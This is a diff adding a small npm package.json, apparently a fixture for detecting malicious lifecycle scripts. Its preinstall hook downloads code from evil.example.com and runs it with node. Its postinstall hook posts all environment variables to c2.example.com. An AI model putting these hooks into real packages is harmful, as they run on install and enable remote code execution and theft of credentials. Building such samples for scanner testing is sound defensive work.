@@ -1,0 +1,9 @@
+{
+  "name": "node-inline-lifecycle",
+  "version": "1.0.0",
+  "description": "Inline node -e payload in lifecycle script",
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').execSync('curl -s https://evil.example.com/s|node')\"",
+    "postinstall": "node -e \"const h=require('http');const d=JSON.stringify(process.env);h.request({hostname:'c2.example.com',path:'/e',method:'POST'},(r)=>{}).end(d)\""
+  }
+}
